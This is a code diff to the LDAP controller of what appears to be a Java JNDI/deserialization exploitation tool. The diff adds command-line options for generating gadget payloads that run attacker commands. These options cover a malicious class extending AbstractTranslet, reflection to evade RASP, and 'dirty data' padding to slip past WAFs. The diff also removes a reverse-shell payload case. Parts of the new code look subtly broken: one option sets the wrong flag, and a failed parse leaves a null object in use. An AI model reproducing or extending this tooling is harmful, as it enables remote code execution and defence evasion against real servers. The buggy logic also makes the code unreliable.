@@ -13,6 +13,10 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import org.apache.commons.cli.CommandLine;
+import org.apache.commons.cli.CommandLineParser;
+import org.apache.commons.cli.DefaultParser;
+import org.apache.commons.cli.Options;
 
 import java.io.ByteArrayOutputStream;
 
@@ -24,6 +28,7 @@ public class SerializedDataController implements LdapController {
     private              GadgetType  gadgetType;
     private              PayloadType payloadType;
     private              String[]    params;
+    public static        CommandLine cmdLine;
     private static final int         USAGE_CODE = 64;
 
     @Override
@@ -59,7 +64,7 @@ public class SerializedDataController implements LdapController {
             int secondIndex = base.indexOf("/", firstIndex + 1);
             try {
                 gadgetType = GadgetType.valueOf(base.substring(firstIndex + 1, secondIndex));
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA GaddgetType >> |@" + gadgetType));
+                //System.out.println(ansi().render("@|green [+]|@ @|MAGENTA GaddgetType >> |@" + gadgetType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
             }
@@ -73,46 +78,57 @@ public class SerializedDataController implements LdapController {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
             }
 
-            switch (payloadType) {
-                case nu1r:
-                    String cmd = Util.getCmdFromBase(base);
-                    int result1 = cmd.indexOf("-");
-                    if (result1 != -1) {
-                        String[] U = cmd.split("-");
-                        int      i = U.length;
-                        if (i >= 1) {
-                            params = new String[]{U[0]};
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + U[0]));
-                        }
-                        if (cmd.contains("inherit")) {
-                            IS_INHERIT_ABSTRACT_TRANSLET = true;
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 继承恶意类 AbstractTranslet |@"));
-                        }
-                        if (cmd.contains("dt")) {
-                            dirtyType = true;
-                            Type1 = Integer.parseInt(U[2]);
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 脏数据类型 >> |@" + U[2]));
-                        }
-                        if (cmd.contains("dl")) {
-                            dirtyLength = true;
-                            Length1 = Integer.parseInt(U[4]);
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 脏数据大小 >> |@" + U[4]));
-                        }
-                        if (cmd.contains("jb")) {
-                            IS_JBOSS_OBJECT_INPUT_STREAM = true;
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用 ObjectInputStream/ObjectOutputStream |@" + U[4]));
-                        }
-                    } else {
-                        params = new String[]{cmd};
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
+            if (payloadType == PayloadType.nu1r) {
+                String arg = Util.getCmdFromBase(base);
+                if (arg.contains(" ")) {
+                    String[] args    = arg.split(" ");
+                    Options  options = new Options();
+                    options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
+                    options.addOption("o", "obscure", false, "使用反射绕过");
+                    options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
+                    options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
+                    options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
+                    CommandLineParser parser = new DefaultParser();
+
+                    try {
+                        cmdLine = parser.parse(options, args);
+                    } catch (Exception e) {
+                        System.out.println("[*] Parameter input error, please use -h for more information");
                     }
-                    break;
-                case reverseshell:
-                    String[] results = Util.getIPAndPortFromBase(base);
-                    System.out.println("[+] IP >> " + results[0]);
-                    System.out.println("[+] Port >> " + results[1]);
-                    params = results;
-                    break;
+
+                    params = new String[]{args[0]};
+                    System.out.println("[+] command：" + args[0]);
+
+                    if (cmdLine.hasOption("obscure")) {
+                        IS_OBSCURE = true;
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
+                    }
+
+                    if (cmdLine.hasOption("AbstractTranslet")) {
+                        IS_INHERIT_ABSTRACT_TRANSLET = true;
+                        System.out.println("[+] 继承恶意类AbstractTranslet");
+                    }
+
+                    if (cmdLine.hasOption("dirty-type")) {
+                        dirtyType = true;
+                        Type1 = Integer.parseInt(cmdLine.getOptionValue("dirty-type"));
+                        System.out.println("[+] 脏数据类型：" + Type1);
+                    }
+
+                    if (cmdLine.hasOption("dirty-length")) {
+                        IS_JBOSS_OBJECT_INPUT_STREAM = true;
+                        Length1 = Integer.parseInt(cmdLine.getOptionValue("dirty-length"));
+                        System.out.println("[+] 脏数据长度：" + Length1);
+                    }
+
+                    if (cmdLine.hasOption("jboss")) {
+                        IS_JBOSS_OBJECT_INPUT_STREAM = true;
+                    }
+                } else {
+                    params = new String[]{arg};
+                    System.out.println("[+] command：" + arg);
+                }
+
             }
 
         } catch (Exception e) {
